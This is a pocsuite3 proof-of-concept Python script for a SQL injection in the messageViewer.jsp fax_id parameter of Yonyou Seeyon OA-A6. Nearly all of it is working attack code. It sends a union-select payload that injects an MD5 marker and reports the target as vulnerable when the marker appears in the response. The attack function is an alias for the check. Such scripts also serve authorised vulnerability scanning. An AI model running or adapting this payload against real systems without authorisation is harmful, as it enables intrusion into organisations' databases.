#!/usr/bin/env python
# coding: utf-8
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''用友致远OA-A6 messageViewer.jsp sqli'''
    desc = ''''''
    solution = ''''''
    severity = '''high'''
    vulType = '''sql-inj'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''用友致远OA-A6'''
    appVersion = '''*'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        result = {}
        self.url,ip,port = parse_ip_port(self.target)
        action = "/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=-1%27%20union%20all%20select%20NULL,concat(0x7e7e7e,md5(996)),NULL,NULL%23"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
        }
        verify_url = make_verify_url(self.url, action, mod=0)
        resp = requests.get(verify_url, headers=headers, verify=False, timeout=15, allow_redirects=False)
        if resp.status_code == 200 and b"~~~0b8aff0438617c05" in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['port'] = port
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
